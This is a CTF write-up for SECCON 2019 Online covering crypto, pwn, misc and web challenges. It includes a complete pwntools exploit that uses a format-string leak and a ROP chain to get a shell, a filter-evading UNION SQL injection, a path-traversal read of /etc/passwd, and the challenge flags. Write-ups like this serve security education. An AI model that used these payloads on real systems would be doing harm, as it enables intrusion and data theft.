# SECCON 2019 Online CTF

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20191019-secconquals/) of this writeup.**


 - [SECCON 2019 Online CTF](#seccon-2019-online-ctf)
   - [Crypto](#crypto)
     - [coffee_break](#coffee_break)
     - [ZKPay](#zkpay)
   - [Pwn](#pwn)
     - [Lazy](#lazy)
   - [Misc](#misc)
     - [pngbomb](#pngbomb)
   - [Web](#web)
     - [Option-Cmd-U](#option-cmd-u)
     - [web_search](#web_search)
     - [fileserver](#fileserver)


## Crypto

### coffee_break

We are given the encrypted flag `FyRyZNBO2MG6ncd3hEkC/yeYKUseI/CxYoZiIeV2fe/Jmtwx+WbWmU1gtMX9m905`. The encryption is described as follow.
Firstly, it is encrypted by an encryption function `encrypt` defined in the code, with key `SECCON`, then it's padded.
Secondly, it is then encrypted by ECB mode AES, with key `seccon2019\0\0\0\0...\0`.
Both of them are obviously invertible, which gave us the flag.

`SECCON{Success_Decryption_Yeah_Yeah_SECCON}`

### ZKPay

After Registering the site with any new username and password, we know there are 500 dollar in a new account and our goal is to make an account with more than 1,000,000 dollar.

Use the functionality "Send Money", it generates a QR code with the following text value:

```
username=helloworld&amount=100&proof=MN5WdjPmu9rNgswKNMYaA2Ktw9qa01YD4LGQmPIqo+slMSAwTD7QBwdxfVNnTm+PntPhzuNAqLKXAT0Pcfn6nlusRxswCjCdAjvql47aX8W5UrCtwvaQkYu7OjyWL4kmCwk25T/cLcnLd0WV7PZQ7fPVyGICHRDgwzvhrpmVKeXClZBiwagMMCAwxsG5bgjAaRO85MQQJwfFNaKP85KTzu2XWhnzGBjL9SQwCjA0TYNsuNLj7Vq2z5ZGnZEGp9RW0hQ7Q9HMwkQwvKHdATEgMIlaN2hxW+dol7Xq1ysg/ZUEM2j6/6D3/TY/p567VwArMAowtsm/Hzj2y18pjeXV3ZMWfhGdn0dz0iZdgE9ccL1ZqwswCjCEKxwu1THo1s5a8InYdF16UwKQuDNfvjDoWYCpciUlJjEK&hash=e87511c561c5eb1ece61dfe556537cc1152479ff8e1f721eff16d7248adde849
```

Try to generate one more QR code with different amount of money, we see that only the "amount" value differs. Hence, we can forge some strange amount of money in our transaction.

If we send minus amount to another account, my Balance will increase.

Just send a huge minus amount, i.e. -999501, and you'll get the flag.

flag: `SECCON{y0u_know_n07h1ng_3xcep7_7he_f4ct_th47_1_kn0w}`

## Pwn

### Lazy

```python=
#!/usr/bin/env python
from pwn import *

# SECCON{Keep_Going!_KEEP_GOING!_K33P_G01NG!}

context.arch = 'amd64'
e = ELF( './lazy' )
y = remote( 'lazy.chal.seccon.jp' , 33333 )

def pri( p ):
    y.sendlineafter( '4: Manage' , '4' )
    y.sendlineafter( 'Input file name' , p )

def leak( adr ):
    y.sendlineafter( '4: Manage' , '4' )
    p = '%7$sABCD'.ljust( 0x8 , 'a' ) + p64( adr )
    y.sendlineafter( 'Input file name' , p )
    y.recvuntil( 'Filename : ' )
    d = y.recvuntil( 'ABCD' )[:-4] + '\0'
    return d

y.sendlineafter( '3: Exit' , '2' )
y.sendlineafter( ':' , '_H4CK3R_' )
y.sendlineafter( ':' , '3XPL01717' )

p = '%7$s%9$p'.ljust( 0x8 , 'a' ) + p64( e.got.read )
pri( p )
y.recvuntil( 'Filename : ' )
l = u64( y.recv(6) + '\0\0' )

y.recvuntil( '0x' )
canary = int( y.recvuntil( '00' ) , 16 )
print hex( canary )


d = DynELF( leak, l - 0xd6000 )
system = d.lookup( 'system', 'libc' )
print hex( system )

pop_rdi = 0x00000000004015f3
ppr = 0x00000000004015f1

download = 0x400E23
listing = 0x400D72

csu = 0x4015D0

d = e.bss() + 0x100

p = flat(
    'a' * 8,
    0 , 0 ,
    canary,
    0,
    e.plt.atoi,
    pop_rdi,
    0,
    ppr, d , 0, e.plt.read,
    pop_rdi,
    d,
    system
)
pri( p )

y.sendafter( 'No such file!' , '/bin/sh\0' )

y.interactive()
```

## Misc

### pngbomb
We are given an png image. The image is `2147483647 x 32, 1-bit grayscale, non-interlaced`, but due to the DEFLATE algorithm of png format, the image itself is as small as `36MB`.

We can get the compressed data via `binwalk` (Bytes `0x29~`). It is a Zlib compressed data. Though we may not extract the data into a file, we can pipe it to our program, and read it as streaming data.



## Web

### Option-Cmd-U

Our target is to visit http://nginx/flag.php

And the `nginx`'s IP is `172.18.0.3`

We can use DNS-Rebinding to bypass restriction:

172.18.0.3 <---> any ip

=> `SECCON{what_a_easy_bypass_314208thg0n423g}`


### web_search

single quote:

- `'` => Error
- `''` => OK
- `'''` => Error
- `'#` => OK

So this is a SQL Injection challenge.

But it will filter `and`, `or`, `%20`, `,`, ....

We can use some trick to bypass it, e.g. `anandd` => `and`, `oorr` => `or`, and replace `%20` with `/**/`

If we try `'or 2=2 #`, it will output `The flag is "SECCON{Yeah_Sqli_Success_" ... well, the rest of flag is in "flag" table. Try more!`.

And we can use UNION-based MySQL Injection to dump the second half flag:

`http://web-search.chal.seccon.jp/?q=%27anandd/**/1=2/**/union/**/select/**/*/**/from/**/((SELECT/**/1)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(select/**/3)c)%23`

<br>

get the db name:

`http://web-search.chal.seccon.jp/?q='anandd/**/1=2/**/union/**/select/**/*/**/from/**/((SELECT/**/(schema_name)/**/from/**/infoorrmation_schema.schemata)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(select/**/3)c)%23`

=> `seccon_sqli`

<br>

get the table name:

`http://web-search.chal.seccon.jp/?q=%27anandd/**/1=2/**/union/**/select/**/*/**/from/**/((SELECT/**/(table_name)/**/from/**/infoorrmation_schema.tables)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(select/**/3)c)%23`

=> `flag`

<br>

get the column name:

`http://web-search.chal.seccon.jp/?q=%27anandd/**/1=2/**/union/**/select/**/*/**/from/**/((SELECT/**/(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=%27flag%27)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(select/**/3)c)%23`

=> piece

<br>

get the flag:

`http://web-search.chal.seccon.jp/?q=%27anandd/**/1=2/**/union/**/select/**/*/**/from/**/((SELECT/**/(piece)/**/from/**/flag)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(select/**/3)c)%23`

=> `You_Win_Yeah}`

so the flag is `SECCON{Yeah_Sqli_Success_You_Win_Yeah}`



### fileserver

The source code of server is in `/app.rb`.

The validation function has some problems, it will check `[` before checking `{`

So we can use `{[}` to bypass the validation, it will not raise 400 Bad Request.

And we can use it to read arbitrary file:

http://fileserver.chal.seccon.jp:9292/%7B,%5B%7D/etc/passwd

Use `/%00/` to list directory and get the flag filename:

`http://fileserver.chal.seccon.jp:9292/%00/tmp/flags/`

=> `/tmp/flags/qqVnBHOmIS0SIJz97VLGaWXs2CtuQBNW.txt`

flag: `SECCON{You_are_the_Globbin'_Slayer}`
